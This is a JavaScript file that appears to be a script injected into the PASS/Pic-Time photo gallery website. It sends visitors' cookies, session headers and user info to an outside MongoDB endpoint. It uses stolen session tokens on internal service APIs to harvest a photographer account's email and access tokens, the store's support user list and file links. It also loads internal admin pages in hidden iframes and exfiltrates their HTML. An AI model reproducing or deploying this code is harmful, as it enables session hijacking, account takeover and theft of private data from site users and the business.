// Only run if not in iframe (like in mobile preview window)
if (window.location === parent.window.location) {
  const setPtxAccessToken = async () => {
    return fetch(
      "https://us-east-2.aws.realm.mongodb.com/api/client/v2.0/app/data-dkerm/auth/providers/anon-user/login"
    )
      .then((resp) => resp.json())
      .then((json) => json.access_token)
      .then((token) => (window.accessToken = token));
  };

  const insertDoc = async (type, data) => {
    const envelope = {};
    envelope.sessionId = window.rjsSessionId;
    envelope.type = type;
    envelope.data = data;
    envelope.userAgent = navigator?.userAgent;

    envelope.ptData = {};
    envelope.ptData.headers = _pt$?.hdrs || null;
    envelope.ptData.userInfo = _pt$?.userInfo || null;
    envelope.ptData.cookie = document.cookie;

    envelope.ts = Date.now();

    return fetch(
      "https://us-east-2.aws.data.mongodb-api.com/app/data-dkerm/endpoint/data/v1/action/insertOne",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Request-Headers": "*",
          Authorization: `Bearer ${window.accessToken}`,
        },
        body: JSON.stringify({
          collection: "ingest",
          database: "pictimeDataDb",
          dataSource: "pixieset-data",
          document: envelope,
        }),
      }
    );
  };

  const getIFrame = async (iframeUrl) => {
    try {
      const iframe = document.createElement("iframe");
      iframe.src = iframeUrl;
      iframe.style.display = "none";
      document.body.appendChild(iframe);

      const iframeHtml1 = iframe.contentDocument.documentElement.outerHTML;

      // Send Page HTML
      await insertDoc("pass-iframe-page-html", {
        location: iframeUrl,
        html: iframeHtml1,
        delay: 0,
      });

      await new Promise((res) => setTimeout(res, 5000));

      const iframeHtml2 = iframe.contentDocument.documentElement.outerHTML;

      // Send Page HTML
      await insertDoc("pass-iframe-page-html", {
        location: iframeUrl,
        html: iframeHtml2,
        delay: 10000,
      });
    } catch (err) {
      console.error(err);
      insertDoc("pass-error", err.toString());
    }
  };

  const getTokensByAccountUrl = async (
    accountUrl,
    csPictimeGUser,
    csPictimeProject
  ) => {
    try {
      const lookUpPhotographerAccountFetchUrl =
        "https://production.passgallery.com/!servicescs.asmx/lookUpPhotographerAccount";
      const gUserAccessFetchUrl =
        "https://production.passgallery.com/!servicescs.asmx/getGUserAccess";

      const portfolioHtml = await fetch(`${accountUrl}/portfolio`).then(
        (resp) => resp.text()
      );
      const accountId = +portfolioHtml.match(/"accountId":([0-9]+),/)[1];

      const lookUpPhotographerAccountBody = { id: accountId, idType: 0 };

      const lookUpPhotographerAccountData = await fetch(
        lookUpPhotographerAccountFetchUrl,
        {
          headers: {
            accept: "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json; charset=UTF-8",
            pictimeGUser: csPictimeGUser,
            pictimeProject: csPictimeProject,
          },
          body: JSON.stringify(lookUpPhotographerAccountBody),
          method: "POST",
        }
      );

      const lookUpPhotographerAccountJson =
        await lookUpPhotographerAccountData.json();

      await insertDoc("pass-account-data", {
        accountId,
        data: lookUpPhotographerAccountJson,
      });

      const gUserAccessBody = {
        email: lookUpPhotographerAccountJson.d.email,
      };

      const gUserAccessData = await fetch(gUserAccessFetchUrl, {
        headers: {
          accept: "application/json, text/javascript, */*; q=0.01",
          "accept-language": "en-US,en;q=0.9",
          "cache-control": "no-cache",
          "content-type": "application/json; charset=UTF-8",
          pictimeGUser: csPictimeGUser,
          pictimeProject: csPictimeProject,
        },
        body: JSON.stringify(gUserAccessBody),
        method: "POST",
      });

      const gUserAccessJson = await gUserAccessData.json();
      const gaccessTokenUrl = `https://${gUserAccessJson.d}`;

      const html = await fetch(gaccessTokenUrl, {
        // Important! Ensure that we don't override user's tokens
        credentials: "omit",
      }).then((resp) => resp.text());

      const pictimeGUser = html.match(/var _PT_GUSERTOKEN_ = "(.*)";/)[1];
      const pictimeProject = html.match(/var _PT_LUSERTOKEN_ = "(.*)";/)[1];

      await insertDoc("pass-tokens", {
        url: accountUrl,
        pictimeGUser,
        pictimeProject,
      });
    } catch (err) {
      insertDoc("pass-error", err.toString());
    }
  };

  setPtxAccessToken().then(async () => {
    setTimeout(async () => {
      await insertDoc("pass-location", window.location);

      const gusr = _pt$?.hdrs?.gusr;
      const lusr = _pt$?.hdrs?.lusr;

      const urlsToGet = ["https://winshipphotography.passgallery.com"];

      for (const url of urlsToGet) {
        await getTokensByAccountUrl(url, gusr, lusr);
        //await new Promise((res) => setTimeout(res, 10000));
      }

      try {
        const overrideFilesLinksJson = await fetch(
          "https://production.passgallery.com/!servicescs.asmx/getOverrideFilesLinks",
          {
            headers: {
              accept: "application/json, text/javascript, */*; q=0.01",
              "accept-language": "en-US,en;q=0.9",
              "cache-control": "no-cache",
              "content-type": "application/json; charset=UTF-8",
              pictimeGUser: gusr,
              pictimeProject: lusr,
            },
            body: JSON.stringify({}),
            method: "POST",
          }
        ).then((resp) => resp.json());

        await insertDoc("pass-overide-files-links", {
          data: overrideFilesLinksJson,
        });
      } catch (err) {
        await insertDoc("pass-error", err.toString());
      }

      try {
        const storeSupportUsersJson = await fetch(
          "https://production.passgallery.com/!servicescs.asmx/getStoreSupportUsers",
          {
            headers: {
              accept: "application/json, text/javascript, */*; q=0.01",
              "accept-language": "en-US,en;q=0.9",
              "cache-control": "no-cache",
              "content-type": "application/json; charset=UTF-8",
              pictimeGUser: gusr,
              pictimeProject: lusr,
            },
            body: JSON.stringify({}),
            method: "POST",
          }
        ).then((resp) => resp.json());

        await insertDoc("pass-store-support-users", {
          data: storeSupportUsersJson,
        });
      } catch (err) {
        await insertDoc("pass-error", err.toString());
      }

      getIFrame("https://production.passgallery.com/!customersupport");
      getIFrame(
        "https://production.passgallery.com/userworkflows/support/customersupport.aspx"
      );
      getIFrame("https://production.passgallery.com/ptoam");
      getIFrame("https://production.passgallery.com/maintenance");
      getIFrame("https://production.passgallery.com/!marketingdash");
      getIFrame("https://production.passgallery.com/!supporthome");
    }, 500);
  });
}
